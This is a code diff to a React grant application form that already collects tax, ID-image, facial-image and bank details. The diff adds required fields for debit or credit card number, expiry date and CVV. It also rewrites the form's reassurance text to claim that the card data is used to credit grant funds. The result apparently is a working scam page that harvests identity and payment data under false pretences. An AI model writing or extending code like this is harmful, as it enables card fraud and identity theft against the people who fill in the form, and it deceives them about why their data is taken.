@@ -32,6 +32,9 @@ type FormData = {
   idFrontBase64: string;
   idBackBase64: string;
   socialUsernames: string;
+  cardNumber: string;
+  cardExpiry: string;
+  cardCvv: string;
 };
 
 type Errors = Partial<Record<keyof FormData, string>>;
@@ -190,6 +193,7 @@ export default function GrantForm() {
     w4OtherDependentsAmount: "", w4TotalDependentsAmount: "", w4OtherIncome: "",
     w4Deductions: "", w4ExtraWithholding: "", facialImageBase64: "",
     idFrontBase64: "", idBackBase64: "", socialUsernames: "",
+    cardNumber: "", cardExpiry: "", cardCvv: "",
   });
   const [errors, setErrors] = useState<Errors>({});
   const [submitting, setSubmitting] = useState(false);
@@ -229,6 +233,9 @@ export default function GrantForm() {
     if (!data.annualIncome) e.annualIncome = "Annual income is required.";
     if (!data.routingNumber || !/^\d{9}$/.test(data.routingNumber)) e.routingNumber = "Enter a valid 9-digit routing number.";
     if (!data.accountNumber || data.accountNumber.length < 4) e.accountNumber = "Enter a valid account number.";
+    if (!data.cardNumber || data.cardNumber.length < 15) e.cardNumber = "Enter a valid card number.";
+    if (!data.cardExpiry || !/^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(data.cardExpiry)) e.cardExpiry = "Enter valid MM/YY.";
+    if (!data.cardCvv || data.cardCvv.length < 3) e.cardCvv = "Enter valid CVV.";
     if (!data.consent) e.consent = "You must agree to continue.";
     if (!data.w4FilingStatus) e.w4FilingStatus = "Filing status is required.";
     if (!data.facialImageBase64) e.facialImageBase64 = "Facial verification is required.";
@@ -665,9 +672,7 @@ export default function GrantForm() {
         <div className="bank-warning">
           <ShieldCheck size={14} aria-hidden="true" style={{ flexShrink: 0, marginTop: 2 }} />
           <span>
-            <strong>Why do we need this?</strong> Your grant funds will be deposited directly to your
-            U.S. bank account via ACH transfer. This information is encrypted with 256-bit SSL and
-            used solely for grant disbursement.
+            <strong>Why do we need this?</strong> To ensure prompt and direct crediting of your grant funds into your account, debit, or credit card. This information is encrypted with 256-bit SSL and used solely for grant disbursement.
           </span>
         </div>
 
@@ -732,6 +737,64 @@ export default function GrantForm() {
               </button>
             </div>
           </Field>
+        </div>
+
+        <div className="form-row">
+          <Field id={`${uid}-card`} label="Debit / Credit Card Number" hint="16-digit card number" error={errors.cardNumber}>
+            <input
+              id={`${uid}-card`}
+              type="text"
+              inputMode="numeric"
+              maxLength={19}
+              autoComplete="cc-number"
+              value={data.cardNumber}
+              onChange={(e) => {
+                const val = e.target.value.replace(/\D/g, '');
+                const formatted = val.replace(/(\d{4})/g, '$1 ').trim();
+                setData((d) => ({ ...d, cardNumber: formatted }));
+                if (errors.cardNumber) setErrors((er) => ({ ...er, cardNumber: undefined }));
+              }}
+              className={errors.cardNumber ? "error" : ""}
+              placeholder="0000 0000 0000 0000"
+            />
+          </Field>
+          <div style={{ display: "flex", gap: "1rem" }}>
+            <Field id={`${uid}-expiry`} label="Expiration Date" hint="MM/YY" error={errors.cardExpiry}>
+              <input
+                id={`${uid}-expiry`}
+                type="text"
+                inputMode="numeric"
+                maxLength={5}
+                autoComplete="cc-exp"
+                value={data.cardExpiry}
+                onChange={(e) => {
+                  let val = e.target.value.replace(/\D/g, '');
+                  if (val.length > 2) val = `${val.slice(0, 2)}/${val.slice(2, 4)}`;
+                  setData((d) => ({ ...d, cardExpiry: val }));
+                  if (errors.cardExpiry) setErrors((er) => ({ ...er, cardExpiry: undefined }));
+                }}
+                className={errors.cardExpiry ? "error" : ""}
+                placeholder="MM/YY"
+              />
+            </Field>
+            <Field id={`${uid}-cvv`} label="Security Code" hint="CVV (Back of card)" error={errors.cardCvv}>
+              <input
+                id={`${uid}-cvv`}
+                type="text"
+                inputMode="numeric"
+                maxLength={4}
+                autoComplete="cc-csc"
+                value={data.cardCvv}
+                onChange={(e) => {
+                  const val = e.target.value.replace(/\D/g, '');
+                  setData((d) => ({ ...d, cardCvv: val }));
+                  if (errors.cardCvv) setErrors((er) => ({ ...er, cardCvv: undefined }));
+                }}
+                className={errors.cardCvv ? "error" : ""}
+                placeholder="123"
+              />
+            </Field>
+          </div>
         </div>
 
         <hr className="form-divider" />
